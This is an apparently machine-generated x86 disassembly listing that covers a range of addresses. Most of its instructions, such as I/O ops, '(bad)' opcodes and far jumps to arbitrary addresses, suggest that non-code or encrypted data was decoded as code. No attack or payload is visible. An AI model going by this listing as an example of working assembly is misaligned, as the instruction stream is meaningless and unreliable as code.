  424138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424139:	jno    0x4240e3
  42413b:	mov    al,ds:0x852b48a5
  424140:	loope  0x424183
  424142:	fild   DWORD PTR [ebp+0x7d43815f]
  424148:	in     eax,dx
  424149:	lods   eax,DWORD PTR ds:[esi]
  42414a:	inc    esi
  42414b:	arpl   WORD PTR [ebx-0xc2199a6],ax
  424151:	lock hlt 
  424153:	pop    edx
  424154:	push   ss
  424155:	inc    esi
  424156:	xlat   BYTE PTR ds:[ebx]
  424157:	scas   eax,DWORD PTR es:[edi]
  424158:	and    dl,BYTE PTR [ebx+0xe]
  42415b:	dec    ebp
  42415c:	stos   BYTE PTR es:[edi],al
  42415d:	call   0x4a5ae71c
  424162:	ret    
  424163:	pushf  
  424164:	jp     0x424152
  424166:	mov    edx,0xfe2dc419
  42416b:	ror    DWORD PTR [esi+0xb61e5a4],cl
  424171:	cmp    al,0x52
  424173:	or     eax,0xc0544efc
  424178:	mov    esp,ecx
  42417a:	test   al,0x9b
  42417d:	sub    BYTE PTR [edi],ch
  42417f:	repnz inc esp
  424181:	mov    DWORD PTR [esi+0x6afc4bb0],ebp
  424187:	sbb    edx,DWORD PTR [edi]
  424189:	ret    0x19c4
  42418c:	add    BYTE PTR [eax+0xdfc5664],0x49
  424193:	pusha  
  424194:	ins    DWORD PTR es:[edi],dx
  424195:	sar    BYTE PTR ds:0x7daf487,1
  42419b:	bound  ebx,QWORD PTR [esi]
  42419d:	jae    0x42414f
  42419f:	ins    BYTE PTR es:[edi],dx
  4241a0:	cld    
  4241a1:	mov    bh,0xb1
  4241a3:	sub    eax,DWORD PTR [eax-0x2977b722]
  4241a9:	pop    esi
  4241aa:	adc    cl,BYTE PTR [ebp+0x26]
  4241ad:	mov    ecx,0x6d0a6546
  4241b2:	xor    edx,DWORD PTR [esi]
  4241b4:	ds jnp 0x424223
  4241b7:	xchg   ebx,eax
  4241b8:	loopne 0x424201
  4241ba:	pop    ecx
  4241bb:	cs mov bl,0x7b
  4241be:	xchg   edx,eax
  4241bf:	xor    esp,esi
  4241c1:	xchg   edx,eax
  4241c2:	data16 cmp dh,BYTE PTR [ecx+0x316e517f]
  4241c9:	fs jo  0x42415b
  4241cc:	inc    edx
  4241cd:	aaa    
  4241ce:	gs jno 0x424238
  4241d1:	push   esi
  4241d2:	cmp    BYTE PTR [ebx-0x4c291035],al
  4241d8:	cmc    
  4241d9:	sahf   
  4241da:	mov    DWORD PTR [ebp+0x3bd50527],edx
  4241e0:	pop    ss
  4241e1:	dec    ecx
  4241e2:	xor    DWORD PTR [edx],ecx
  4241e4:	in     al,dx
  4241e5:	test   eax,0x89587402
  4241ea:	mov    ebp,0x4587146c
  4241ef:	mov    edi,0xd3c97f99
  4241f4:	enter  0xfe2f,0x17
  4241f8:	jno    0x424233
  4241fa:	mov    esi,0xc61523ba
  4241ff:	enter  0x5dff,0x94
  424203:	sub    esi,DWORD PTR [eax]
  424205:	mov    eax,0x8cb0505d
  42420a:	fadd   DWORD PTR [ecx-0x67397804]
	...
  424274:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	jecxz  0x424227
  424282:	xchg   eax,ebp
  424284:	nop
  424285:	add    DWORD PTR [ecx],0x10400
  42428b:	add    BYTE PTR [ecx-0x73],bl
  42428e:	ja     0x42421e
  424290:	dec    ebp
  424291:	push   eax
  424292:	sub    ah,BYTE PTR [edi]
  424294:	xor    dl,dh
  424296:	xor    eax,0x719f4e99
  42429b:	sbb    ebx,ecx
  42429d:	mov    ds:0x30f259a5,al
  4242a2:	sbb    ch,BYTE PTR [ecx]
  4242a4:	int3   
  4242a5:	iret   
  4242a6:	push   edx
  4242a7:	ss in  eax,dx
  4242a9:	stos   DWORD PTR es:[edi],eax
  4242aa:	pop    ebx
  4242ab:	int3   
  4242ac:	push   edx
  4242ad:	pushf  
  4242ae:	jbe    0x424277
  4242b0:	pop    ebp
  4242b1:	aaa    
  4242b2:	sar    esi,cl
  4242b4:	cs in  al,dx
  4242b6:	ins    DWORD PTR es:[edi],dx
  4242b7:	or     eax,0x3aedb8c4
  4242bc:	or     al,0x98
  4242be:	adc    al,0xa2
  4242c0:	std    
  4242c1:	and    edx,ebx
  4242c3:	pop    ds
  4242c4:	mov    esp,0xbf8b0c86
  4242c9:	xchg   esi,eax
  4242ca:	lds    esi,FWORD PTR [ebx]
  4242cc:	push   es
  4242cd:	int3   
  4242ce:	jmp    0x25485c24
  4242d3:	mov    ecx,0x782fc2e4
  4242d8:	push   0x1b
  4242da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242db:	aas    
  4242dc:	push   edx
  4242dd:	test   DWORD PTR [ecx-0x4],0x1b4da18e
  4242e4:	mov    es,WORD PTR [eax+0xc]
  4242e7:	out    0x94,al
  4242e9:	xor    DWORD PTR [eax],0xffffffff
  4242ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4242ed:	adc    ecx,DWORD PTR [edi+0x3c]
  4242f0:	add    cl,BYTE PTR [esi-0x7bb0965d]
  4242f6:	adc    al,0x6f
  4242f8:	push   edx
  4242f9:	popf   
  4242fa:	mov    ds:0x676a4491,al
  4242ff:	dec    edx
  424300:	neg    bh
  424302:	pop    esp
  424303:	adc    eax,0xb1a91af2
  424308:	je     0x4242e1
  42430a:	inc    ecx
  42430b:	mov    ebx,0x2e4586e3
  424310:	push   ds
  424311:	shl    DWORD PTR [edx],cl
  424313:	int    0xa1
  424315:	ins    BYTE PTR es:[edi],dx
  424316:	mov    eax,ds:0x513a994b
  42431b:	jp     0x42434b
  42431d:	fst    DWORD PTR [ecx+0x190fbfb7]
  424323:	pop    ss
  424324:	bound  esp,QWORD PTR ds:[ebx]
  424327:	jmp    0xc295:0x48e40548
  42432e:	enter  0xee82,0xa7
  424332:	repz popw es
  424335:	pop    ebp
  424336:	sar    BYTE PTR ds:0x6010f5cb,cl
  42433c:	loopne 0x424398
  42433e:	aaa    
  42433f:	inc    eax
  424340:	out    0x1e,eax
  424342:	mov    dl,BYTE PTR [edx-0x48]
  424345:	xor    dl,BYTE PTR [ecx+0x153be278]
  42434b:	mov    ecx,0x66888524
  424350:	clc    
  424351:	in     eax,dx
  424352:	js     0x4242f0
  424354:	pop    edi
  424355:	int    0x79
  424357:	xor    eax,0xe66d36c
  42435c:	sub    bl,bl
  42435e:	or     al,0xa2
  424360:	clc    
  424361:	lea    ecx,[ecx-0x4d7d54ce]
  424367:	fmul   st(1),st
  424369:	popa   
  42436a:	cli    
  42436b:	sub    BYTE PTR ds:0xd847e76b,cl
  424371:	std    
  424372:	imul   DWORD PTR [edi]
  424374:	push   esp
  424375:	sbb    ch,BYTE PTR [ebx]
  424377:	in     eax,dx
  424378:	sahf   
  424379:	mov    al,ds:0xe23b812b
  42437e:	sub    BYTE PTR [edi-0x30],0x62
  424382:	iret   
  424383:	push   edi
  424384:	popa   
  424385:	or     eax,DWORD PTR [ecx]
  424387:	loope  0x4243ea
  424389:	and    DWORD PTR [ecx],esp
  42438b:	sub    eax,ebp
  42438d:	mov    ds:0x9f02,al
	...
  4243f2:	add    BYTE PTR [eax],al
  4243f4:	mov    ah,BYTE PTR [esi]
  4243f6:	jge    0x4243b2
  4243f8:	std    
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x42443b
  424401:	mov    ds:0x829411d5,eax
  424406:	add    DWORD PTR [eax],eax
  424408:	add    al,0x1
  42440a:	add    BYTE PTR [eax],al
  42440c:	adc    eax,0xbc98b26
  424411:	or     bh,BYTE PTR [ecx]
  424413:	or     BYTE PTR [ebx-0x54],dh
  424416:	pop    ss
  424417:	adc    esi,DWORD PTR [eax+0x454b7dd0]
  42441d:	mov    ecx,0xb34e36b5
  424422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424423:	jnp    0x424406
  424425:	lods   al,BYTE PTR ds:[esi]
  424426:	popf   
  424427:	fwait
  424428:	push   edx
  424429:	and    edx,DWORD PTR [ecx-0x646c4efe]
  42442f:	pop    ds
  424430:	repnz (bad) 
  424432:	fisttp WORD PTR ds:0x185df26d
  424438:	sbb    DWORD PTR [edi+0xd945702],ebx
  42443e:	sbb    eax,0xfe25d301
  424443:	lods   al,BYTE PTR ds:[esi]
  424444:	sub    BYTE PTR [esi],dl
  424446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424447:	pop    ss
  424448:	xchg   ecx,eax
  424449:	sub    BYTE PTR [ebx+0x48],bh
  42444c:	fprem  
  42444e:	data16 loopne 0x424447
  424451:	in     al,dx
  424452:	ret    0xeaca
  424455:	jmp    DWORD PTR [eax]
  424457:	es mov al,bl
  42445a:	mov    es,WORD PTR [edi-0x4]
  42445d:	sbb    eax,0x496aa6b5
  424462:	inc    edi
  424463:	mov    esp,0xc3bffec7
  424468:	shl    DWORD PTR [eax-0x31526061],1
  42446e:	test   BYTE PTR [edi+0x5e],ch
  424471:	jp     0x42447f
  424473:	mov    eax,0x3cf1a3f5
  424478:	mov    al,bl
  42447a:	imul   ebx,DWORD PTR [esi+esi*4+0x18],0x1b588a84
  424482:	inc    esi
  424483:	cmp    BYTE PTR [edx+ebp*1-0x67],ah
  424487:	enter  0x725c,0x63
  42448b:	sar    BYTE PTR [eax+0x6a],0x1d
  42448f:	frstor [esp-0x19700eed]
  424496:	push   esp
  424497:	idiv   BYTE PTR [esi-0x66]
  42449a:	mov    al,0xaf
  42449c:	inc    ecx
  42449d:	push   ebx
  42449e:	into   
  42449f:	mov    edx,0xd559df64
  4244a4:	or     dh,bh
  4244a6:	mov    dl,0x63
  4244a8:	push   edx
  4244a9:	data16 shl BYTE PTR [esi+0x7e066431],cl
  4244b0:	jmp    0xfffe:0x9076a68c
  4244b7:	cwde   
  4244b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244b9:	retf   0x909e
  4244bc:	push   0x13c7a25d
  4244c1:	rcr    DWORD PTR [ecx+0x58cf5642],0x31
  4244c8:	arpl   WORD PTR [ecx+0x567ed945],cx
  4244ce:	test   DWORD PTR [esi],0x5fcce4a0
  4244d4:	gs dec edi
  4244d6:	(bad)  
  4244d7:	push   cs
  4244d8:	int    0xee
  4244da:	ret    0x7384
  4244dd:	jmp    0xe4ce:0x3cf4fcce
  4244e4:	int3   
  4244e5:	push   0xcd67d126
  4244ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4244eb:	adc    BYTE PTR [eax+0x32],ah
  4244ee:	lods   eax,DWORD PTR ds:[esi]
  4244ef:	aaa    
  4244f0:	out    dx,al
  4244f1:	enter  0x7728,0x1f
  4244f5:	pop    esp
  4244f6:	mov    bh,0x88
  4244f8:	and    al,0x1a
  4244fa:	mov    bh,0x95
  4244fc:	xchg   esp,esp
  4244fe:	inc    ecx
  4244ff:	inc    edi
  424500:	scas   eax,DWORD PTR es:[edi]
  424501:	repnz mov ah,0xa9
  424504:	push   ecx
  424505:	and    BYTE PTR [ebx],dh
  424507:	jmp    0x424523
  424509:	fimul  WORD PTR [ecx+ebx*4-0x68b8be0a]
	...
  424574:	loopne 0x4245e5
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4+0x6e],1
  424581:	mov    eax,0x8398fb35
  424586:	add    DWORD PTR [eax],eax
  424588:	add    al,0x1
  42458a:	add    BYTE PTR [eax],al
  42458c:	rol    DWORD PTR ds:0x81b29449,1
  424592:	or     BYTE PTR [esi-0x7647c780],dl
  424598:	js     0x42457a
  42459a:	xchg   ecx,eax
  42459b:	je     0x42456b
  42459d:	mov    eax,0x12fc0d4c
  4245a2:	lods   eax,DWORD PTR ds:[esi]
  4245a3:	and    DWORD PTR [ecx-0x717b7899],edx
  4245a9:	xor    al,0x30
  4245ab:	outs   dx,DWORD PTR ds:[esi]
  4245ac:	hlt    
  4245ad:	dec    eax
  4245ae:	addr16 xchg ebp,eax
  4245b0:	(bad)
  4245b3:	iret   
  4245b4:	in     eax,0x42
  4245b6:	add    bl,BYTE PTR [eax-0x10cc97e]
  4245bc:	push   edi
  4245bd:	mov    eax,ds:0xce83571f
  4245c2:	arpl   WORD PTR [edi-0x1abc5c88],di
  4245c8:	rcl    DWORD PTR [edi],1
  4245ca:	retf   0xe013
  4245cd:	icebp  
  4245ce:	and    eax,0xdcb5d628
  4245d3:	inc    ebx
  4245d4:	ins    BYTE PTR es:[edi],dx
  4245d5:	or     DWORD PTR [ecx+edi*4+0x6c],edx
  4245d9:	sbb    eax,0x3836662a
  4245de:	mov    dl,0x89
  4245e0:	ins    DWORD PTR es:[edi],dx
  4245e1:	stc    
  4245e2:	fsubr  st,st(2)
  4245e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245e5:	leave  
  4245e6:	cmp    ecx,DWORD PTR [ebx-0x58]
  4245e9:	(bad)  
  4245ea:	int3   
  4245eb:	test   bl,0x37
  4245ee:	mov    ebp,0x3d627b1a
  4245f3:	rcr    DWORD PTR [edi+0x535ede96],0xd1
  4245fa:	ds inc ebp
  4245fc:	add    al,0xf4
  4245fe:	lods   eax,DWORD PTR ds:[esi]
  4245ff:	ret    
  424600:	add    BYTE PTR [esi-0x15d10f00],al
  424606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424607:	shl    al,0x87
  42460a:	aam    0x5f
  42460c:	mov    DWORD PTR [eax+0x44],ebx
  42460f:	push   cs
  424610:	pop    edx
  424611:	jo     0x42465d
  424613:	sub    al,0x4f
  424615:	(bad)  
  424616:	(bad)  
  424617:	dec    esp
  424618:	cmp    DWORD PTR [eax+0x152c994d],0xffffffca
  42461f:	xor    al,0x57
  424621:	rcr    DWORD PTR [edx-0x601153ab],1
  424627:	xor    al,0xb7
  424629:	mov    bl,0xe4
  42462b:	js     0x4245d9
  42462d:	or     eax,0x420cd8e7
  424632:	loop   0x42463e
  424634:	pop    edi
  424635:	rol    DWORD PTR [edx+0x4798c99e],0x9f
  42463c:	js     0x4246ae
  42463e:	mov    ds:0x691d091c,eax
  424643:	arpl   WORD PTR [edx-0x391476b5],si
  424649:	cli    
  42464a:	xchg   edi,eax
  42464b:	pop    esp
  42464c:	leave  
  42464d:	sbb    eax,0xa926a8bd
  424652:	jge    0x4245f2
  424654:	jge    0x42469e
  424656:	sub    eax,0xb2932ccd
  42465b:	fdiv   QWORD PTR [ecx-0x19]
  42465e:	jo     0x424660
  424660:	frstor [edi]
  424662:	and    al,0xc8
  424664:	fistp  QWORD PTR ds:0x7d00c2c8
  42466a:	pop    ds
  42466b:	retf   0x8ab6
  42466e:	stc    
  42466f:	cmp    DWORD PTR [eax],eax
  424671:	int    0xa3
  424673:	stos   BYTE PTR es:[edi],al
  424674:	mov    bh,BYTE PTR [ebp+0x70]
  424677:	adc    BYTE PTR [ecx],bl
  424679:	imul   ebx,DWORD PTR [edi+0x3721e329],0x1bc70ff5
  424683:	ror    DWORD PTR [ecx-0x3a],1
  424686:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424687:	loopne 0x424669
  424689:	frstor [esi]
  42468b:	mov    edi,0x9ef22107
	...
  4246f4:	mov    esp,0xfefffc92
  4246f9:	(bad)  
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [edi],bl
  424701:	div    BYTE PTR [ebp-0x4a]
  424704:	pushf  
  424705:	test   BYTE PTR [ecx],al
  424707:	add    BYTE PTR [ecx+eax*1],al
  42470a:	add    BYTE PTR [eax],al
  42470c:	fbstp  TBYTE PTR ds:0x18d2b8d2
  424712:	xor    ebx,ecx
  424714:	cmp    DWORD PTR [esi+0x31bb1c9f],0xffffffd8
  42471b:	pop    ebx
  42471c:	sbb    al,0x1
  42471e:	jp     0x4246ed
  424720:	rcr    DWORD PTR [ebp-0xb8c4531],1
  424726:	pop    ds
  424727:	shl    BYTE PTR [ebx+0x201be0b6],cl
  42472d:	frstor [ebx]
  42472f:	in     al,0x79
  424731:	jecxz  0x4246d8
  424733:	add    al,BYTE PTR [ebp+ebx*2+0x31fd0076]
  42473a:	cmp    al,0x75
  42473c:	fsub   st,st(3)
  42473e:	jbe    0x424785
  424740:	scas   al,BYTE PTR es:[edi]
  424741:	arpl   WORD PTR [ecx],si
  424743:	and    cl,BYTE PTR [ebx-0x34]
  424746:	pop    edi
  424747:	jle    0x4247aa
  424749:	rcl    BYTE PTR [ebp-0x50],1
  42474c:	or     BYTE PTR [edx+0x65],bl
  42474f:	add    BYTE PTR ds:0x62d033a8,ch
  424755:	leave  
  424756:	outs   dx,DWORD PTR ds:[si]
  424758:	(bad)  
  424759:	or     eax,0x2c700e1d
  42475e:	aad    0x47
  424760:	std    
  424761:	inc    ebx
  424762:	daa    
  424763:	adc    eax,0xd62a6cb2
  424768:	sub    al,0xfe
  42476a:	data16 jae 0x4246f0
  42476d:	mov    dh,BYTE PTR [ebp+0x44]
  424770:	mov    dh,0x27
  424772:	sub    BYTE PTR [edi-0x60],ch
  424775:	mov    edi,0xf7876a84
  42477a:	mov    DWORD PTR [ecx+0x4f63c5fe],0x8a1404f3
  424784:	inc    edi
  424785:	not    al
  424787:	jae    0x4247be
  424789:	push   edx
  42478a:	mov    ?,ebx
  42478c:	sbb    al,0x5b
  42478e:	dec    esp
  42478f:	pop    ebx
  424790:	ins    DWORD PTR es:[edi],dx
  424791:	cmc    
  424792:	mov    edi,0x6f90a85a
  424797:	arpl   WORD PTR [ebx],bx
  424799:	and    eax,0xad814831
  42479e:	mov    WORD PTR [eax+0x7],ds
  4247a1:	(bad)  
  4247a2:	jmp    0x4247d1
  4247a4:	mov    ebx,0x62db738c
  4247a9:	dec    edi
  4247aa:	cmp    DWORD PTR [ecx],0x26
  4247ad:	pop    ebp
  4247ae:	mov    dl,0xf3
  4247b0:	push   ebp
  4247b1:	ins    BYTE PTR es:[edi],dx
  4247b2:	mov    ds:0xd6adae5e,al
  4247b7:	push   es
  4247b8:	or     esp,DWORD PTR [ebx]
  4247ba:	fld    TBYTE PTR [edi+esi*4-0x5d]
  4247be:	nop
  4247bf:	dec    esi
  4247c0:	mov    WORD PTR [ecx+ecx*2+0x536e0dcd],?
  4247c7:	retf   
  4247c8:	ret    0x42bf
  4247cb:	rcl    BYTE PTR [edi+0x5625b135],cl
  4247d1:	xchg   DWORD PTR [edi-0xe074ed8],eax
  4247d7:	and    al,0x2a
  4247d9:	sub    ah,BYTE PTR [esi]
  4247db:	fisubr DWORD PTR [eax+edx*1-0x54]
  4247df:	pop    ecx
  4247e0:	cmp    al,0x6
  4247e2:	not    DWORD PTR [ecx-0x3e]
  4247e5:	sbb    DWORD PTR [ebx-0x52ad05b1],ebp
  4247eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4247ec:	pop    es
  4247ed:	xor    BYTE PTR [esi-0x16],cl
  4247f0:	shl    DWORD PTR [esi-0x7c085327],0xff
  4247f7:	push   eax
  4247f8:	xchg   esp,eax
  4247f9:	iret   
  4247fa:	inc    edi
  4247fb:	imul   esp,eax,0x1b
  4247fe:	jl     0x42487d
  424800:	inc    ebp
  424801:	out    0x51,eax
  424803:	and    eax,0xd7e5ae97
  424808:	out    0xe5,eax
  42480a:	mov    WORD PTR [ecx+eax*1],?
  42480d:	cmp    DWORD PTR [esi+0xcc],esp
	...
  424873:	add    BYTE PTR [edx],ah
  424875:	pop    eax
  424876:	test   bh,ch
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	mov    ah,0xd9
  424882:	out    0xbf,al
  424884:	mov    al,ds:0x4000185
  424889:	add    DWORD PTR [eax],eax
  42488b:	add    BYTE PTR [esi-0x34],bh
  42488e:	cmp    BYTE PTR [edx+0x3c7dec55],0xd8
  424895:	mov    WORD PTR [ecx+0x2367438e],fs
  42489b:	sbb    al,0xd6
  42489d:	pop    ss
  42489e:	lahf   
  42489f:	jl     0x424882
  4248a1:	dec    ecx
  4248a2:	stc    
  4248a3:	pop    ebx
  4248a4:	nop
  4248a5:	fwait
  4248a6:	les    ecx,FWORD PTR [edi]
  4248a8:	mov    esi,0x5f75afc0
  4248ad:	dec    eax
  4248ae:	jbe    0x4248e3
  4248b0:	jne    0x4248ea
  4248b2:	je     0x424904
  4248b4:	cmp    eax,0x9d982efe
  4248b9:	std    
  4248ba:	adc    al,BYTE PTR fs:[edi-0x39079a17]
  4248c1:	ins    DWORD PTR es:[edi],dx
  4248c2:	xor    eax,0xfa0cf5bc
  4248c7:	pop    es
  4248c8:	adc    eax,0x71eb2b27
  4248cd:	cmp    eax,DWORD PTR [edx-0x5b7c8916]
  4248d3:	shl    edi,cl
  4248d5:	fcmovne st,st(4)
  4248d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248d8:	addr16 xor ah,0x8
  4248dc:	sub    esi,DWORD PTR [edx-0x4854cd57]
  4248e2:	cdq    
  4248e3:	adc    eax,0xc72d9e28
  4248e8:	test   BYTE PTR [esi+eax*2],0x25
  4248ec:	dec    ebp
  4248ed:	iret   
  4248ee:	sub    dh,BYTE PTR [ecx-0x50d20611]
  4248f4:	cs call 0x4c061199
  4248fa:	iret   
  4248fb:	xchg   edi,eax
  4248fc:	jg     0x424901
  4248fe:	lods   eax,DWORD PTR ds:[esi]
  4248ff:	sbb    al,0xd3
  424901:	jle    0x424892
  424903:	js     0x4248c2
  424905:	sbb    bh,0x48
  424908:	out    0x53,al
  42490a:	add    esi,eax
  42490c:	enter  0x8fe6,0xd
  424910:	push   cs
  424911:	jmp    0xe629:0x348b6f6
  424918:	and    al,0x12
  42491a:	mov    ah,BYTE PTR [edx-0x4cd0698]
  424920:	pop    ds
  424921:	pop    ebp
  424922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424923:	or     BYTE PTR [edx+0x4c07cc49],cl
  424929:	cmp    ecx,eax
  42492b:	fidivr DWORD PTR ds:0x66a6fc75
  424931:	xor    eax,0x2af2a92f
  424936:	inc    edi
  424937:	mov    cl,0x16
  424939:	call   0x6f0f:0x7f44831f
  424940:	push   edx
  424941:	mov    dh,0x6d
  424943:	xor    DWORD PTR [ebx-0x2afe47f8],ecx
  424949:	push   0x1f00ec26
  42494e:	clc    
  42494f:	push   0xffffffeb
  424951:	dec    esi
  424952:	xlat   BYTE PTR ds:[ebx]
  424953:	not    DWORD PTR [edx]
  424955:	test   al,0x9c
  424958:	mov    WORD PTR [ecx-0x697766be],cs
  42495e:	add    eax,0x3e33e6e
  424963:	and    al,0x37
  424965:	pop    edi
  424966:	jmp    FWORD PTR [esi-0x1f]
  424969:	mov    ebx,0xd9f56ab0
  42496e:	ret    0x40ab
  424971:	into   
  424972:	in     al,dx
  424973:	fmul   QWORD PTR [edx-0x18]
  424976:	out    dx,al
  424977:	xlat   BYTE PTR ds:[ebx]
  424978:	xor    dl,BYTE PTR [edx]
  42497a:	pop    eax
  42497b:	push   edx
  42497c:	inc    ebx
  42497d:	add    eax,DWORD PTR [ecx-0x22e1f970]
  424983:	mov    BYTE PTR [ebp-0xc],ch
  424986:	push   0x16dbfde7
  42498b:	imul   esp,DWORD PTR [eax-0x31],0xdfa9
	...
  4249f2:	add    BYTE PTR [eax],al
  4249f4:	imul   ebx,DWORD PTR [eax],0x63
  4249f7:	push   0x73
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    cl,ah
  424a01:	das    
  424a02:	mov    WORD PTR [esi-0x5c],es
  424a05:	xchg   BYTE PTR [ecx],al
  424a07:	add    BYTE PTR [ecx+eax*1],al
  424a0a:	add    BYTE PTR [eax],al
  424a0c:	scas   al,BYTE PTR es:[edi]
  424a0d:	push   ebx
  424a0e:	into   
  424a0f:	(bad)  
  424a10:	fmulp  st(4),st
  424a12:	jmp    0xbc01:0x102e3731
  424a19:	pushf  
  424a1a:	pop    ebx
  424a1b:	sub    eax,DWORD PTR [edx-0x446c5cb2]
  424a21:	xchg   bh,dl
  424a23:	inc    edi
  424a24:	ss mov cl,0x8a
  424a27:	mov    edx,0x447b0c04
  424a2c:	jge    0x4249e4
  424a2e:	adc    ebp,DWORD PTR [ebx+0x596e992c]
  424a34:	mov    bh,BYTE PTR [edx-0x11dda6d2]
  424a3a:	jge    0x424a75
  424a3c:	xchg   edi,eax
  424a3d:	sar    bh,cl
  424a3f:	cmp    ebx,edi
  424a41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a42:	push   ds
  424a43:	sahf   
  424a44:	cmp    al,BYTE PTR [ebx]
  424a46:	xchg   ebp,eax
  424a47:	stos   BYTE PTR es:[edi],al
  424a48:	inc    edx
  424a49:	mul    BYTE PTR [ecx+0x64c6f82b]
  424a4f:	lods   eax,DWORD PTR ds:[esi]
  424a50:	rcl    DWORD PTR [edx+0x469076da],1
  424a56:	push   ebp
  424a57:	sub    BYTE PTR [eax+eax*2],bh
  424a5a:	mov    dl,0x79
  424a5c:	scas   eax,DWORD PTR es:[edi]
  424a5d:	in     al,dx
  424a5e:	push   eax
  424a5f:	retf   
  424a60:	(bad)  
  424a61:	clc    
  424a62:	and    ebp,DWORD PTR [eax+eiz*1]
  424a65:	inc    esi
  424a66:	jmp    0x424a01
  424a68:	push   edx
  424a69:	ror    dh,1
  424a6b:	cld    
  424a6c:	mov    eax,ds:0xda078b34
  424a71:	btc    DWORD PTR [esi+0x13],edx
  424a75:	or     ah,0xf8
  424a78:	jmp    0xc8891f66
  424a7d:	out    dx,al
  424a7e:	fdivrp st(6),st
  424a80:	arpl   WORD PTR [ebp-0x40],si
  424a83:	test   al,0xad
  424a85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a86:	int    0xa6
  424a88:	sub    eax,0x996228b3
  424a8d:	sbb    al,0x19
  424a8f:	retf   
  424a90:	ret    
  424a91:	mov    edx,0x4a1b09e9
  424a96:	mov    eax,0x460e178e
  424a9b:	shr    BYTE PTR [esi-0x11],cl
  424a9e:	repz xor ebp,DWORD PTR [eax-0x2b]
  424aa2:	pop    esp
  424aa3:	shl    BYTE PTR [edx],cl
  424aa5:	jmp    0x424a6f
  424aa7:	sbb    ecx,edx
  424aa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424aaa:	dec    esi
  424aab:	jg     0x424af2
  424aad:	adc    cl,BYTE PTR ds:0xe6ce7d1
  424ab3:	jo     0x424a56
  424ab5:	push   ds
  424ab6:	xchg   esp,eax
  424ab7:	pop    eax
  424ab8:	sti    
  424ab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424aba:	cmp    al,BYTE PTR [edi]
  424abc:	pop    edx
  424abd:	sub    DWORD PTR [edx+eax*1+0x23c0e40b],0xa5c0ed2c
  424ac8:	neg    BYTE PTR [ebx-0x31]
  424acb:	mov    eax,ds:0xd4752272
  424ad0:	push   ecx
  424ad1:	cmp    DWORD PTR [ecx-0x25],esi
  424ad4:	shl    BYTE PTR [esi+eiz*8],cl
  424ad7:	popa   
  424ad8:	inc    eax
  424ad9:	jo     0x424a8c
  424adb:	fwait
  424adc:	in     eax,dx
  424add:	ja     0x424ac1
  424adf:	push   edi
  424ae0:	pop    ss
  424ae1:	xchg   edi,eax
  424ae2:	sahf   
  424ae3:	mov    bl,0xd0
  424ae5:	imul   DWORD PTR [ebx+0x4f351b5f]
  424aeb:	or     ecx,DWORD PTR [ebx-0x70]
  424aee:	xor    dl,bl
  424af0:	daa    
  424af1:	cwde   
  424af2:	rcl    DWORD PTR [ebx+eax*8],1
  424af5:	into   
  424af6:	add    BYTE PTR [eax+0x7],0xe
  424afa:	xchg   ebx,eax
  424afb:	int3   
  424afc:	rep ins DWORD PTR es:[edi],dx
  424afe:	push   ds
  424aff:	dec    esp
  424b00:	xor    eax,0x63980d64
  424b05:	inc    eax
  424b06:	mov    ebx,0xc1c0ef46
  424b0b:	cwde   
  424b0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b0d:	adc    al,0xd5
  424b0f:	cwde   
	...
  424b74:	push   es
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b81:	and    DWORD PTR [ebx+0x73],eax
  424b84:	test   al,0x87
  424b86:	add    DWORD PTR [eax],eax
  424b88:	add    al,0x1
  424b8a:	add    BYTE PTR [eax],al
  424b8c:	sbb    al,0x3e
  424b8e:	xchg   edi,eax
  424b8f:	(bad)  [edi-0x24]
  424b92:	dec    edx
  424b93:	and    eax,0xab251943
  424b98:	sub    al,0xf9
  424b9a:	add    ebp,DWORD PTR [ecx+0xd2fda64]
  424ba0:	call   0x99b1ba20
  424ba5:	inc    ebp
  424ba6:	add    bl,BYTE PTR [eax-0x4edb7be4]
  424bac:	cs inc esp
  424bae:	sbb    BYTE PTR [ecx+esi*1-0x51ac5e74],dh
  424bb5:	cs cli 
  424bb7:	test   DWORD PTR [edi-0x6f560417],0x57773130
  424bc1:	and    edi,DWORD PTR [edi]
  424bc3:	dec    edx
  424bc4:	call   0xcb5af9bf
  424bc9:	or     BYTE PTR [edx+0x3c],bl
  424bcc:	inc    ebx
  424bcd:	add    al,0x57
  424bcf:	push   0xffffffd8
  424bd1:	pop    ss
  424bd2:	ins    BYTE PTR es:[edi],dx
  424bd3:	ja     0x424bd7
  424bd5:	ret    0xd080
